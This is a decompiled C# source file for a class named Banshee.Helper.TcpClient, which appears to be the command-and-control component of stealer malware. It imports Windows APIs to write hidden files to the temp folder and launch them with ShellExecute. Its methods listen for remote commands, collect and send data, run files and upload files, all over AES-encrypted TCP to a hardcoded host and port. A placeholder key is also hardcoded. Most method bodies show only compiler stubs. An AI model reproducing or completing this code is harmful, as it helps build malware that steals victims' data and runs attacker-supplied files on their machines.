﻿using System;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Banshee.Helper
{
	// Token: 0x020000C7 RID: 199
	public class TcpClient
	{
		// Token: 0x06000276 RID: 630
		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x06000277 RID: 631
		[DllImport("kernel32.dll")]
		private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

		// Token: 0x06000278 RID: 632
		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(IntPtr hObject);

		// Token: 0x06000279 RID: 633
		[DllImport("kernel32.dll")]
		private static extern uint GetTempPathA(uint nBufferLength, StringBuilder lpBuffer);

		// Token: 0x0600027A RID: 634
		[DllImport("kernel32.dll")]
		private static extern bool SetFileAttributesA(string lpFileName, uint dwFileAttributes);

		// Token: 0x0600027B RID: 635
		[DllImport("shell32.dll")]
		private static extern IntPtr ShellExecuteA(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x0600027C RID: 636 RVA: 0x00012AC0 File Offset: 0x00012AC0
		public static TcpClient Instance
		{
			get
			{
				object @lock = TcpClient._lock;
				TcpClient instance;
				lock (@lock)
				{
					if (TcpClient._instance == null)
					{
						TcpClient._instance = new TcpClient();
					}
					instance = TcpClient._instance;
				}
				return instance;
			}
		}

		// Token: 0x0600027D RID: 637 RVA: 0x00012B14 File Offset: 0x00012B14
		private TcpClient()
		{
			this._cancellationTokenSource = new CancellationTokenSource();
		}

		// Token: 0x0600027E RID: 638 RVA: 0x00012B28 File Offset: 0x00012B28
		public Task<bool> ConnectAsync()
		{
			TcpClient.<ConnectAsync>d__23 <ConnectAsync>d__;
			<ConnectAsync>d__.<>t__builder = AsyncTaskMethodBuilder<bool>.Create();
			<ConnectAsync>d__.<>4__this = this;
			<ConnectAsync>d__.<>1__state = -1;
			<ConnectAsync>d__.<>t__builder.Start<TcpClient.<ConnectAsync>d__23>(ref <ConnectAsync>d__);
			return <ConnectAsync>d__.<>t__builder.Task;
		}

		// Token: 0x0600027F RID: 639 RVA: 0x00012B6C File Offset: 0x00012B6C
		private byte[] Encrypt(byte[] data, byte[] key)
		{
			byte[] result;
			try
			{
				using (Aes aes = Aes.Create())
				{
					aes.Key = key;
					aes.Mode = CipherMode.CBC;
					aes.Padding = PaddingMode.PKCS7;
					byte[] array = new byte[16];
					using (RandomNumberGenerator randomNumberGenerator = RandomNumberGenerator.Create())
					{
						randomNumberGenerator.GetBytes(array);
					}
					aes.IV = array;
					byte[] array2 = aes.CreateEncryptor(aes.Key, aes.IV).TransformFinalBlock(data, 0, data.Length);
					byte[] array3 = new byte[array.Length + array2.Length];
					Buffer.BlockCopy(array, 0, array3, 0, array.Length);
					Buffer.BlockCopy(array2, 0, array3, array.Length, array2.Length);
					result = array3;
				}
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}

		// Token: 0x06000280 RID: 640 RVA: 0x00012C40 File Offset: 0x00012C40
		private byte[] Decrypt(byte[] data, byte[] key)
		{
			byte[] result;
			try
			{
				if (data.Length < 16)
				{
					throw new ArgumentException("Data too short to contain IV");
				}
				byte[] array = new byte[16];
				byte[] array2 = new byte[data.Length - 16];
				Buffer.BlockCopy(data, 0, array, 0, 16);
				Buffer.BlockCopy(data, 16, array2, 0, data.Length - 16);
				using (Aes aes = Aes.Create())
				{
					aes.Key = key;
					aes.Mode = CipherMode.CBC;
					aes.Padding = PaddingMode.PKCS7;
					aes.IV = array;
					result = aes.CreateDecryptor(aes.Key, aes.IV).TransformFinalBlock(array2, 0, array2.Length);
				}
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}

		// Token: 0x06000281 RID: 641 RVA: 0x00012CFC File Offset: 0x00012CFC
		private Task ListenForCommandsAsync()
		{
			TcpClient.<ListenForCommandsAsync>d__26 <ListenForCommandsAsync>d__;
			<ListenForCommandsAsync>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<ListenForCommandsAsync>d__.<>4__this = this;
			<ListenForCommandsAsync>d__.<>1__state = -1;
			<ListenForCommandsAsync>d__.<>t__builder.Start<TcpClient.<ListenForCommandsAsync>d__26>(ref <ListenForCommandsAsync>d__);
			return <ListenForCommandsAsync>d__.<>t__builder.Task;
		}

		// Token: 0x06000282 RID: 642 RVA: 0x00012D40 File Offset: 0x00012D40
		private Task HandleCommandAsync(ClientMessage message)
		{
			TcpClient.<HandleCommandAsync>d__27 <HandleCommandAsync>d__;
			<HandleCommandAsync>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<HandleCommandAsync>d__.<>4__this = this;
			<HandleCommandAsync>d__.message = message;
			<HandleCommandAsync>d__.<>1__state = -1;
			<HandleCommandAsync>d__.<>t__builder.Start<TcpClient.<HandleCommandAsync>d__27>(ref <HandleCommandAsync>d__);
			return <HandleCommandAsync>d__.<>t__builder.Task;
		}

		// Token: 0x06000283 RID: 643 RVA: 0x00012D8C File Offset: 0x00012D8C
		private Task CollectAndSendDataAsync()
		{
			TcpClient.<CollectAndSendDataAsync>d__28 <CollectAndSendDataAsync>d__;
			<CollectAndSendDataAsync>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<CollectAndSendDataAsync>d__.<>1__state = -1;
			<CollectAndSendDataAsync>d__.<>t__builder.Start<TcpClient.<CollectAndSendDataAsync>d__28>(ref <CollectAndSendDataAsync>d__);
			return <CollectAndSendDataAsync>d__.<>t__builder.Task;
		}

		// Token: 0x06000284 RID: 644 RVA: 0x00012DC8 File Offset: 0x00012DC8
		private Task RunFileAsync(ClientMessage message)
		{
			TcpClient.<RunFileAsync>d__29 <RunFileAsync>d__;
			<RunFileAsync>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<RunFileAsync>d__.<>1__state = -1;
			<RunFileAsync>d__.<>t__builder.Start<TcpClient.<RunFileAsync>d__29>(ref <RunFileAsync>d__);
			return <RunFileAsync>d__.<>t__builder.Task;
		}

		// Token: 0x06000285 RID: 645 RVA: 0x00012E04 File Offset: 0x00012E04
		public Task SendFileAsync(string filePath)
		{
			TcpClient.<SendFileAsync>d__30 <SendFileAsync>d__;
			<SendFileAsync>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<SendFileAsync>d__.<>4__this = this;
			<SendFileAsync>d__.filePath = filePath;
			<SendFileAsync>d__.<>1__state = -1;
			<SendFileAsync>d__.<>t__builder.Start<TcpClient.<SendFileAsync>d__30>(ref <SendFileAsync>d__);
			return <SendFileAsync>d__.<>t__builder.Task;
		}

		// Token: 0x06000286 RID: 646 RVA: 0x00012E50 File Offset: 0x00012E50
		public void Disconnect()
		{
			this._connected = false;
			CancellationTokenSource cancellationTokenSource = this._cancellationTokenSource;
			if (cancellationTokenSource != null)
			{
				cancellationTokenSource.Cancel();
			}
			try
			{
				NetworkStream stream = this._stream;
				if (stream != null)
				{
					stream.Close();
				}
				TcpClient client = this._client;
				if (client != null)
				{
					client.Close();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x040001D9 RID: 473
		private const string SERVER_HOST = "127.0.0.1";

		// Token: 0x040001DA RID: 474
		private const string CLIENT_PORT = "4545";

		// Token: 0x040001DB RID: 475
		private const string AES_KEY = "01234567890123456789012345678901";

		// Token: 0x040001DC RID: 476
		private static TcpClient _instance;

		// Token: 0x040001DD RID: 477
		private static readonly object _lock = new object();

		// Token: 0x040001DE RID: 478
		private TcpClient _client;

		// Token: 0x040001DF RID: 479
		private NetworkStream _stream;

		// Token: 0x040001E0 RID: 480
		private bool _connected;

		// Token: 0x040001E1 RID: 481
		private CancellationTokenSource _cancellationTokenSource;

		// Token: 0x040001E2 RID: 482
		private const uint GENERIC_WRITE = 1073741824U;

		// Token: 0x040001E3 RID: 483
		private const uint FILE_SHARE_NONE = 0U;

		// Token: 0x040001E4 RID: 484
		private const uint CREATE_ALWAYS = 2U;

		// Token: 0x040001E5 RID: 485
		private const uint FILE_ATTRIBUTE_HIDDEN = 2U;

		// Token: 0x040001E6 RID: 486
		private const uint INVALID_HANDLE_VALUE = 4294967295U;
	}
}
